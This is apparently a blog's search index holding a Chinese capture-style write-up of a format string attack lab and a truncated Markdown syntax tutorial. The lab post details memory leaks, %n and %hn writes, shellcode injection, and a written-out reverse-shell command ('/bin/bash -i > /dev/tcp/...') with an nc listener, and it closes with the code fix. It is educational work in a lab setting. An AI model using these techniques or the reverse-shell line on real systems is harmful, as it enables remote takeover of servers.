<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/04/24/Format%20String%20Attack%20Lab/"/>
    <url>/2023/04/24/Format%20String%20Attack%20Lab/</url>
    
    <content type="html"><![CDATA[<h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><ol><li>关闭地址随机化</li></ol><p>$ sudo sysctl -w kernel.randomize_va_space&#x3D;0</p><ol start="2"><li>编译format</li></ol><p>$ make<br>$ make install</p><ol start="3"><li>启动docker</li></ol><p>$ docker-compose build # Build the container image<br>$ docker-compose up # Start the container</p><h2 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h2><p>我们向服务器发送一条良性的消息时，服务器会正常打印消息并输出：<br>(ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)。但是由于format.c中存在格式字符串漏洞printf(msg);如果我们提供格式字符串输入，那么服务器试图myprintf()函数中打印用户输入时，它将崩溃。如下，当我们提供输入“%s”到服务器，那么服务器将会崩溃：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682314314402-d4622ba3-2736-4f8a-af75-ea2cb78f3963.png#averageHue=%230a0806&clientId=ud8f54b0e-afb0-4&from=paste&height=349&id=ucbaa3bdd&name=image.png&originHeight=349&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=208580&status=done&style=none&taskId=u337083fa-bc4f-45ea-85eb-909acfd1a6b&title=&width=865" alt="image.png"></p><h2 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h2><h3 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data."></a>Task 2.A: Stack Data.</h3><p>利用服务器的格式字符串漏洞，当我们提供输入“%x”，服务器将会打印出栈上的数据，我们的任务是判断需要多少个%x格式说明符才能让服务器打印出输入的前四个字节。为此，我们可以将输入的前四个字节设置为一个唯一的数字，如“0x11111111”，然后向服务器输入很多个%x，观察“0x11111111”在输出的第几个位置，如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682314774797-9719ee21-3277-45ff-8ab0-b14acaa32b4f.png#averageHue=%23050402&clientId=ud8f54b0e-afb0-4&from=paste&height=150&id=uf3323351&name=image.png&originHeight=276&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86574&status=done&style=none&taskId=ufead5df9-dc73-400c-8a47-a0776e81ed6&title=&width=470" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682314802337-d10da277-4d88-4426-88ad-5cc170f7734e.png#averageHue=%2317130e&clientId=ud8f54b0e-afb0-4&from=paste&height=441&id=u01ca19b6&name=image.png&originHeight=441&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=412450&status=done&style=none&taskId=u220c58b4-1f0f-43f5-b426-d181642858e&title=&width=865" alt="image.png"><br>根据输出我们可以知道，我们传入的输入的前四个字节在di64个%x的位置。</p><h3 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data ."></a>Task 2.B: Heap Data .</h3><p>在堆区域中存储了一个秘密消息(一个字符串)，我们的任务是将这个秘密信息打印出来。首先需要从服务器打印的输出中找到字符串的地址：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682315217314-ddc6a59b-a8a4-4ed9-9468-56b0be69ea14.png#averageHue=%23120f0c&clientId=ud8f54b0e-afb0-4&from=paste&height=32&id=u09da34f5&name=image.png&originHeight=32&originWidth=495&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13688&status=done&style=none&taskId=u41ab27a1-b613-4568-801d-33c132a1f7e&title=&width=495" alt="image.png"><br>并将这个地址放到格式字符串中。从上一部分我们知道，第64个格式说明符的位置就是缓冲区的内容，因此我们使用%s打印出第64个位置的字符串即是秘密信息，结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682315405980-ad95919b-b9df-4b00-b8c2-fb21cd0c15a6.png#averageHue=%23080605&clientId=ud8f54b0e-afb0-4&from=paste&height=148&id=u069debfc&name=image.png&originHeight=148&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=68224&status=done&style=none&taskId=u62dbe8a4-9c87-4154-9eaf-2a242c5a9b4&title=&width=865" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682315411818-7fb02cb5-b90c-4d4e-8e80-ecd28b11e618.png#averageHue=%230b0907&clientId=ud8f54b0e-afb0-4&from=paste&height=297&id=u2653cf4b&name=image.png&originHeight=297&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=188123&status=done&style=none&taskId=ude63c5b2-ebe2-404e-9176-940fe876116&title=&width=865" alt="image.png"></p><h2 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h2><p>该任务的目标是修改在服务器程序中定义的目标变量的值。目标变量的原始值为0x11223344。假设这个变量持有一个重要的值，它可以影响程序的控制流。如果远程攻击者可以改变它的值，他们就可以改变这个程序的行为。从输出可以得到目标变量的地址为0x080e5068.<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682315690463-ea3a9388-04e8-42c1-aa36-5bed3c7172e0.png#averageHue=%23100d0a&clientId=ud8f54b0e-afb0-4&from=paste&height=120&id=u09de9176&name=image.png&originHeight=120&originWidth=572&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50618&status=done&style=none&taskId=ucc23ed0f-6c11-46d5-bde1-5a0ff7a93a0&title=&width=572" alt="image.png"></p><h3 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value."></a>Task 3.A: Change the value to a different value.</h3><p>在这个子任务中，只要我们成功将目标变量的值修改即可，而不管它是什么值。我们可以使用%n来完成这个任务，格式说明符%n表示已经写入的字符数应该存储到作为参数传递的变量中，我们可以将它写入到buf当中，如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682316043913-3fc3db30-2e6d-4159-b9f0-da091deee887.png#averageHue=%23060403&clientId=ud8f54b0e-afb0-4&from=paste&height=215&id=u21920576&name=image.png&originHeight=215&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79941&status=done&style=none&taskId=ua68b03ea-746c-41ee-a252-993bd407ca3&title=&width=865" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682316049945-c5777bc6-71df-4901-b460-5d9e4a677c28.png#averageHue=%23a08a6a&clientId=ud8f54b0e-afb0-4&from=paste&height=566&id=u09b8dc29&name=image.png&originHeight=566&originWidth=703&originalType=binary&ratio=1&rotation=0&showTitle=false&size=605222&status=done&style=none&taskId=u2dff4243-9203-44ff-9e2a-90cf041504e&title=&width=703" alt="image.png"><br>可以看到，目标变量的值变成了0x000001fc。</p><h3 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000."></a>Task 3.B: Change the value to 0x5000.</h3><p>在此子任务中，我们需要将目标变量的内容更改为特定值0x5000。从A中可以知道想要变成0x5000，那么就要让前面打印的字符串的长度变成0x5000，但是又不能改变指针指向的地址。通过计算可得，0x5000&#x3D;20480&#x3D;4+62*325+326。使用相同的方法构造payload如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682316269348-c50ca285-59c7-4f6c-98d9-22900a670b77.png#averageHue=%23080504&clientId=ud8f54b0e-afb0-4&from=paste&height=47&id=ua469dba4&name=image.png&originHeight=47&originWidth=684&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22589&status=done&style=none&taskId=u0b5a3288-5fdc-4020-a380-e8c299ed10a&title=&width=684" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682316281551-9c8b4b62-60e1-4b64-a6cb-69976c8b8c1d.png#averageHue=%23a5906d&clientId=ud8f54b0e-afb0-4&from=paste&height=384&id=u10b6a95e&name=image.png&originHeight=384&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=415665&status=done&style=none&taskId=ub176d38b-3adc-4f3b-87c5-8f99fcf0237&title=&width=865" alt="image.png"><br>可以看到，目标变量的值变成了0x00005000。</p><h3 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD."></a>Task 3.C: Change the value to 0xAABBCCDD.</h3><p>这个子任务与前面的子任务类似，只是目标值现在是一个大数字。在格式字符串攻击中，该值是printf()函数打印出的字符总数;打印这么多字符可能要花几个小时。我们需要使用更快的方法，基本思想是使用%hn，这样我们就可以修改两个字节的内存空间。根据小端法，最高字节的地址为0x080e506a，最低两位字节的地址为0x080e5068。则字符串开头为0x080e506a+”aaaa”+0x080e5068，一共是12个字符。中间四个字节可以是任意值，只是为了提供缓冲区。0xAABB&#x3D;43707&#x3D;12+693*62+729，0xCCDD-0xAABB&#x3D;8738。然后就可以构造payload。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682316637294-6039ff96-ca04-49e8-8ab6-c0fc1bc64f80.png#averageHue=%23090705&clientId=ud8f54b0e-afb0-4&from=paste&height=241&id=u01b3e008&name=image.png&originHeight=241&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=139803&status=done&style=none&taskId=uf615e152-c308-40db-bd80-148b17a18cf&title=&width=865" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682316644094-847bb60a-035a-4e2c-b06c-d280871edd0a.png#averageHue=%23181511&clientId=ud8f54b0e-afb0-4&from=paste&height=171&id=u65e5d523&name=image.png&originHeight=171&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=137702&status=done&style=none&taskId=ud98e3b89-4c26-45f7-a6d2-a8e07410255&title=&width=865" alt="image.png"></p><h2 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h2><p>现在我们已经准备好攻击最重要的部分，代码注入。我们想要将一段二进制格式的恶意代码注入到服务器的内存中，然后使用格式字符串漏洞修改函数的返回地址字段，这样当函数返回时，它就会跳转到我们注入的代码。<br>此任务使用的技术与前一个任务类似:它们都修改内存中的4字节数。前一个任务修改的是目标变量，而这个任务修改的是函数的返回地址字段。<br>为了成功完成这个任务，有必要了解在myprintf()中调用printf()函数时的堆栈布局。如下图：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682316787403-e66b4197-6000-4818-a1e2-68b9450f890f.png#averageHue=%23f8f8f8&clientId=ud8f54b0e-afb0-4&from=paste&height=392&id=u7a968b12&name=image.png&originHeight=392&originWidth=708&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47830&status=done&style=none&taskId=u8b2853c9-26c1-4511-9ec9-bfec10e4b97&title=&width=708" alt="image.png"><br>首先，我们要回答几个问题：<br>Question 1: 标记2和3对应的内存地址是多少？<br>根据server的输出显示，buf的地址为0xffffd5b0, myprintf的帧指针为0xffffd4d8.因此，②：myprintf()的返回地址存储的地址为0xffffd4d8+0x4 &#x3D; 0xffffd4dc。③：用户输入的起始地址0xffffd5b0。<br>Question 2:我们需要多少个%x将指针移动到③？<br>根据Task2.A，我们需要输入63个%x将格式字符串参数指针从1移动到3.<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682317257479-de35ffba-e44c-4c20-849f-8c49db528706.png#averageHue=%230e0b08&clientId=ud8f54b0e-afb0-4&from=paste&height=181&id=u857fb0aa&name=image.png&originHeight=181&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=117766&status=done&style=none&taskId=u1fed072f-e616-4db5-80e1-fa7ce17f58c&title=&width=865" alt="image.png"></p><h3 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell."></a>Getting a Reverse Shell.</h3><p>要把shellcode注入到服务器执行，首先要确定shellcode的位置，然后我们跳转到shellcode处执行。因此，我们第一步先将shellcode载入到content中，为此，我们先获取到shellcode的长度以获取载入位置。在exploit中打印len(shellcode)结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682317333977-6f100821-9840-4890-873e-af0ee950a7d5.png#averageHue=%230c0a07&clientId=ud8f54b0e-afb0-4&from=paste&height=105&id=u9808959a&name=image.png&originHeight=105&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73936&status=done&style=none&taskId=uad993ff0-333e-4b78-9aaa-982c3574396&title=&width=865" alt="image.png"><br>将shellcode放在buf末尾，则shellcode的起始地址为<br>buf+1500-len(shellcode) &#x3D; 0xffffd5b0 + 1500 – 136 &#x3D; 0xffffdb04.<br>采用task3.C相同方式将shellcode的地址写入到myprintf()的返回地址.<br>0xffff&#x3D;65535&#x3D;12+62*1056+51,注意0xdb04 &lt; 0xffff,因此通过打印0x1db04个字符造成溢出从而打印0xdb04，0x1db04 – 0xffff &#x3D; 56069.构造payload如下：<img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682317392454-6cd6a6bc-6580-485e-be91-4acfb7f1876a.png#averageHue=%230a0806&clientId=ud8f54b0e-afb0-4&from=paste&height=289&id=u41954189&name=image.png&originHeight=289&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=164047&status=done&style=none&taskId=u77724805-adbb-4505-a9ce-3c7fd482ab4&title=&width=865" alt="image.png"><br>注意shellcode中 ls 那一行修改为 “&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;10.9.0.1&#x2F;9090 0&lt;&amp;1 2&gt;&amp;1 *”，然后在本地执行 nc -nv -l 9090 监听本地 9090 端口的 tcp 连接。<br>运行结果：<br>服务器：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682318037648-0acfaefa-c046-44bd-bb67-ec0edb01d1b0.png#averageHue=%230d0b08&clientId=ud8f54b0e-afb0-4&from=paste&height=110&id=u765f555e&name=image.png&originHeight=110&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60106&status=done&style=none&taskId=ucbd57b8f-1586-4508-ba3e-008031b8ff0&title=&width=865" alt="image.png"><br>监听窗口：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682318052712-4f843a67-7702-497b-a2fa-28407d681b5e.png#averageHue=%23080604&clientId=ud8f54b0e-afb0-4&from=paste&height=282&id=ueb2e07fb&name=image.png&originHeight=282&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=105779&status=done&style=none&taskId=u0f7345ac-0ea9-46ba-a1f1-c844ca497f3&title=&width=865" alt="image.png"></p><h2 id="Task-5-Attacking-the-64-bit-Server-Program"><a href="#Task-5-Attacking-the-64-bit-Server-Program" class="headerlink" title="Task 5: Attacking the 64-bit Server Program"></a>Task 5: Attacking the 64-bit Server Program</h2><p>在前面的任务中，我们的目标服务器是32位程序。在本任务中，我们切换到64位服务器程序。我们的新目标是10.9.0.6，它运行64位版本的format程序。首先向该服务器发送一个hello消息,可以看到帧指针和缓冲区地址的值变成了8个字节长(而不是32位程序中的4个字节)。我们的工作是构造有效负载以利用服务器的格式字符串漏洞。最终目标是在目标服务器上获得根shell。需要使用64位版本的shellcode。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682318229459-8a055001-a65e-4bf2-90b4-a6d973b82db2.png#averageHue=%23130f08&clientId=ud8f54b0e-afb0-4&from=paste&height=163&id=Phqvq&name=image.png&originHeight=163&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129969&status=done&style=none&taskId=uef5728f4-e932-48d9-b8fd-fb0f8253b98&title=&width=865" alt="image.png"><br><strong>64位地址引起的挑战。</strong>x64架构带来的一个挑战是地址中的零。虽然x64架构支持64位地址空间，但只允许从0x00到0x00007FFFFFFFFFFF的地址。这意味着对于每个地址(8字节)，最高的两个字节总是零。这就产生了一个问题。如果在格式字符串的中间放置一个地址，当printf()解析格式字符串时，它将在看到零时停止解析。基本上，格式字符串中第一个零之后的任何内容都不会被视为格式字符串的一部分。这里，我们在程序中没有内存拷贝，所以我们可以在输入中有0，但是把它们放在哪里是很关键的。</p><h4 id="一个小技巧"><a href="#一个小技巧" class="headerlink" title="一个小技巧"></a>一个小技巧</h4><p>自由的移动参数指针。我们可以使用 k$ 将参数移动到第 k 个参数的位置。比如 %3$.20x 表示将参数移动到第 3 个，然后以 %.20x 的格式输出。</p><h4 id="测试-content-0-的偏移"><a href="#测试-content-0-的偏移" class="headerlink" title="测试 content[0] 的偏移"></a>测试 content[0] 的偏移</h4><p>参照Task2.A，构造payload可以得出需要34个%x来输出第一个字节。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682318670314-debd001d-f7c6-41ca-ab3d-03452bbd95ff.png#averageHue=%23050403&clientId=ud8f54b0e-afb0-4&from=paste&height=275&id=u203650f7&name=image.png&originHeight=275&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=98757&status=done&style=none&taskId=ucf45d69f-e95f-4d84-97fe-c4a8c6ac1d2&title=&width=865" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682318684620-e6f12a2f-4eef-4a29-9560-3e3d49d71412.png#averageHue=%23947552&clientId=ud8f54b0e-afb0-4&from=paste&height=108&id=ud6ac0aef&name=image.png&originHeight=108&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=127016&status=done&style=none&taskId=ud1ca5cbe-1cdc-4691-bfe6-b59aa9855ff&title=&width=865" alt="image.png"><br>同上，我们可以得到len(shellcode) &#x3D; 165，myprintf的返回地址为0x00007fffffffe420+8 &#x3D; 0x00007fffffffe428。将shellcode放在buf末尾，则shellcode的起始地址为buf+1500-len(shellcode) &#x3D; 0x00007fffffffe4e0 + 1500 – 165 &#x3D; 0x00007fffffffea17.然后我们开始构造payload，如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682318947401-aafff085-ba23-4cd9-b9bf-0e54f8aa0401.png#averageHue=%23080605&clientId=ud8f54b0e-afb0-4&from=paste&height=354&id=u415475ef&name=image.png&originHeight=354&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=200532&status=done&style=none&taskId=uc92dd5c0-4016-43de-aad3-c6dd882b8f2&title=&width=865" alt="image.png"><br><strong>注意，与32位不同的是，在构造content时，我们要把格式字符串放在地址的前面，否则printf()解析格式字符串时，它将在看到零时停止解析。并且由于我们采用%46$hn这样的方式移动参数，要把参数的位置计算正确，如因为content[0]是第34个参数，那么content[80:88]所在的参数位置就是34+80&#x2F;8 &#x3D; 44。</strong><br>运行结果：成功拿到reverse shell。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682319305707-a3c02f96-024e-4aff-8828-87f29df4ff7e.png#averageHue=%23060504&clientId=ud8f54b0e-afb0-4&from=paste&height=259&id=u35cf21a3&name=image.png&originHeight=259&originWidth=860&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89131&status=done&style=none&taskId=u4b385bf3-8307-47e0-9b29-c4d57d03723&title=&width=860" alt="image.png"></p><h2 id="Task-6-Fixing-the-Problem"><a href="#Task-6-Fixing-the-Problem" class="headerlink" title="Task 6: Fixing the Problem"></a>Task 6: Fixing the Problem</h2><p>回顾gcc编译生成的警告信息：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682319432700-29d3f698-1f69-44ca-aec1-c0cab5beb06f.png#averageHue=%230a0807&clientId=ud8f54b0e-afb0-4&from=paste&height=390&id=u9e4ea3e5&name=image.png&originHeight=390&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=164461&status=done&style=none&taskId=u4ad3972d-1020-4f9e-8ac6-6bf737f7761&title=&width=865" alt="image.png"><br>问题就出在printf（）中没有格式说明符，修复如下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682319509540-dbc048df-0f5e-4af0-90af-994554d184e3.png#averageHue=%23020101&clientId=ud8f54b0e-afb0-4&from=paste&height=119&id=u2b20effa&name=image.png&originHeight=119&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43570&status=done&style=none&taskId=u98207d6d-2a00-4790-8116-4eb7305c76b&title=&width=865" alt="image.png"><br>这样我们输入什么，输出也就是什么，不会再造成漏洞。再编译一下，已经没有警告消息：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/35806717/1682319574720-333cf49c-a585-4abc-9d38-3cc28fd2fe85.png#averageHue=%230c0a07&clientId=ud8f54b0e-afb0-4&from=paste&height=154&id=u49e36c2e&name=image.png&originHeight=154&originWidth=865&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90499&status=done&style=none&taskId=ua36516cb-15eb-4351-ba62-686bcd2aa9f&title=&width=865" alt="image.png"><br>并且再进行攻击尝试，发现攻击已经失效。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>markdown基本语法</title>
    <link href="/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <url>/2023/03/09/markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Markdown基本语法"><a href="#Markdown基本语法" class="headerlink" title="Markdown基本语法"></a>Markdown基本语法</h1><p>大三了，菜鸡本人终于准备开始写博客了（可惜了之前学那么多东西都没有记录下来，导致现在大部分都忘得差不多了，哭）。作为开始，当然是学习Markdown啦，以前也用过但是没有系统整理过markdown的基本语法，正好作为第一篇博客水一水（bushi）。话不多说，开始我的博客生涯!</p><hr><h1 id="后缀"><a href="#后缀" class="headerlink" title="后缀"></a>后缀</h1><p>新建文件xxx.md，后缀是 <strong>.md</strong></p><h1 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h1><p>“#”表示一级标题，“##”表示二级，以此类推。</p><h2 id="可选语法"><a href="#可选语法" class="headerlink" title="可选语法"></a>可选语法</h2><p>还可在文本下方添加任意数量的‘&#x3D;’号标识一级标题，或者用‘-’号标识二级标题。</p><pre><code class="hljs">注意：不同的Markdown应用程序处理‘#’和标题之间的空格方式并不一致。为了兼容考虑，使用一个空格在‘#’与标题之间进行分隔。</code></pre><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>正文直接输入就可以了</p><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="1-markdown段落"><a href="#1-markdown段落" class="headerlink" title="1. markdown段落"></a>1. markdown段落</h2><p>要创建段落，应该使用空白行将一行或多行文本进行分隔。不应该使用空格或制表符缩进段落。  </p><h2 id="2-markdown换行语法"><a href="#2-markdown换行语法" class="headerlink" title="2. markdown换行语法"></a>2. markdown换行语法</h2><p>在一行的末尾添加两个或多个空格，然后按回车键，即可创建一个换行。<br></p><pre><code class="hljs">注意：几乎每个markdown应用程序都支持两个或多个空格进行换行，称为“结尾空格”的方式，但这是有争议的，因为很难在编辑器中直接看到空格，并且很多人在每个句子后面都会有意或无意地添加两个空格。由于这个原因，几乎每个markdown应用程序都支持另一种换行方式： HTML的&lt;br&gt;标签。  </code></pre><h2 id="3-markdown强调语法"><a href="#3-markdown强调语法" class="headerlink" title="3. markdown强调语法"></a>3. markdown强调语法</h2><h3 id="粗体"><a href="#粗体" class="headerlink" title="粗体"></a>粗体</h3><p>要加粗文本，请在单词或短语的前后各添加两个星号或下划线。如需加粗一个单词或短语的中间部分用于表示强调的话，需要在要加粗部分的两侧各添加两个星号.</p><p>例:  I just love **bold text** . -&gt; I just love <strong>bold text</strong> . <br><br>     I just love __bold text__ . -&gt; I just love <strong>bold text</strong> .<br><br>     Love**is**bold -&gt; Love<strong>is</strong>bold</p><pre><code class="hljs">注意：Markdown 应用程序在如何处理单词或短语中间的下划线上并不一致。为兼容考虑，在单词或短语中间部分加粗的话，请使用星号（asterisks）。</code></pre><h3 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h3><p>与粗体类似，在要斜体突出部分 前后加上一个星号或下划线。同样，要突出单词的中间部分，在字母前后各添加一个星号，中间不要带空格。</p><pre><code class="hljs">注意：要同时用粗体和斜体突出显示文本，请在单词或短语的前后各添加三个星号或下划线。要加粗并用斜体显示短语或单词的中间部分，请在要突出部分前后各添加三个星号，中间不要带空格。</code></pre><p>例:  I just love *bold text* . -&gt; I just love <em>bold text</em> .<br><br>     I just love _bold text_ . -&gt; I just love <em>bold text</em> . <br><br>     Love***is***bold -&gt; Love<em><strong>is</strong></em>bold</p><h2 id="4-markdown引用语法"><a href="#4-markdown引用语法" class="headerlink" title="4. markdown引用语法"></a>4. markdown引用语法</h2><p>要创建引用块，应在段落前添加一个’&gt;’符号。<br></p><pre><code class="hljs">&gt; 这是一个引用 -&gt; </code></pre><blockquote><p>这是一个引用</p></blockquote><h3 id="多个段落的块引用"><a href="#多个段落的块引用" class="headerlink" title="多个段落的块引用"></a>多个段落的块引用</h3><p>块引用可以包含多个段落。为段落之间添加的空白行也添加一个’&gt;’即可。<br></p><pre><code class="hljs">&gt; Dorothy followed her through many of the beautiful rooms in her castle.  &gt;   &gt; The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</code></pre><blockquote><p>Dorothy followed her through many of the beautiful rooms in her castle.  </p><p>The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</p></blockquote><h3 id="嵌套块引用"><a href="#嵌套块引用" class="headerlink" title="嵌套块引用"></a>嵌套块引用</h3><p>块引用可以嵌套，在要嵌套的段落前添加一个’&gt;’符号即可。<br></p><pre><code class="hljs">&gt; Dorothy followed her through many of the beautiful rooms in her castle.&gt;&gt;&gt; The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</code></pre><blockquote><p>Dorothy followed her through many of the beautiful rooms in her castle.</p><blockquote><p>The Witch bade her clean the pots and kettles and sweep the floor and keep the fire fed with wood.</p></blockquote></blockquote><h3 id="带有其他元素的块引用"><a href="#带有其他元素的块引用" class="headerlink" title="带有其他元素的块引用"></a>带有其他元素的块引用</h3><p>块引用可以包含其他markdown格式的元素，如<br></p><pre><code class="hljs">&gt; #### The quarterly results look great!&gt;&gt; - Revenue was off the chart.&gt; - Profits were higher than ever.&gt;&gt;  *Everything* is going according to **plan**.</code></pre><blockquote><h4 id="The-quarterly-results-look-great"><a href="#The-quarterly-results-look-great" class="headerlink" title="The quarterly results look great!"></a>The quarterly results look great!</h4><ul><li>Revenue was off the chart.</li><li>Profits were higher than ever.</li></ul><p> <em>Everything</em> is going according to <strong>plan</strong>.</p></blockquote><h2 id="5-mrakdown列表语法"><a href="#5-mrakdown列表语法" class="headerlink" title="5. mrakdown列表语法"></a>5. mrakdown列表语法</h2><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>要创建有序列表，应在每个列表项前添加数字并紧跟一个英文句点.数字不必按照数学顺序排列，但是列表应当以数字1开始。</p><p>例：<br></p><pre><code class="hljs">1. First item1. Second item1. Third item1. Fourth item</code></pre><ol><li>First item</li><li>Second item</li><li>Third item</li><li>Fourth item</li></ol><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>要创建无序列表，需要在每个列表项前面添加’-‘、’*’或’+’。缩进一个或多个列表项可以创建嵌套列表。</p><p>例：<br></p><pre><code class="hljs">- First item    - Second item        - Third item- Fourth item</code></pre><ul><li>First item<ul><li>Second item<ul><li>Third item</li></ul></li></ul></li><li>Fourth item</li></ul><p>注意：不要混合使用开始符号</p><h3 id="在列表中嵌套其他元素"><a href="#在列表中嵌套其他元素" class="headerlink" title="在列表中嵌套其他元素"></a>在列表中嵌套其他元素</h3><p> 要在保留列表连续性的同时在列表中添加另一种元素，需要将该元素缩进四个空格或一个制表符。<br><br> 如：<br><br> 段落：</p><pre><code class="hljs">*   This is the first list item.*   Here&#39;s the second list item.    I need to add another paragraph below the second list item.*   And here&#39;s the third list item.</code></pre><ul><li><p>This is the first list item.</p></li><li><p>Here’s the second list item.</p><p>I need to add another paragraph below the second list item.</p></li><li><p>And here’s the third list item.</p></li></ul><p>引用块：  </p><pre><code class="hljs">*   This is the first list item.*   Here&#39;s the second list item.    &gt; A blockquote would look great below the second list item.*   And here&#39;s the third list item.</code></pre><ul><li><p>This is the first list item.</p></li><li><p>Here’s the second list item.</p><blockquote><p>A blockquote would look great below the second list item.</p></blockquote></li><li><p>And here’s the third list item.</p></li></ul><p>代码块：<br>代码块通常采用四个空格或一个制表符缩进。当他们被放入列表时，需要缩进八个空格或两个制表符。</p><ol><li><p>Open the file.</p></li><li><p>Find the following code block on line 21:</p><pre><code class="hljs">&lt;html&gt;  &lt;head&gt;    &lt;title&gt;Test&lt;/title&gt;  &lt;/head&gt;</code></pre></li><li><p>Update the title to match the name of your website.</p></li></ol><p>图片：  </p><pre><code class="hljs">1.  Open the file containing the Linux mascot.2.  Marvel at its beauty.    ![Tux, the Linux mascot](/Tux.png)3.  Close the file.</code></pre><ol><li><p>Open the file containing the Linux mascot.</p></li><li><p>Marvel at its beauty.</p><p><img 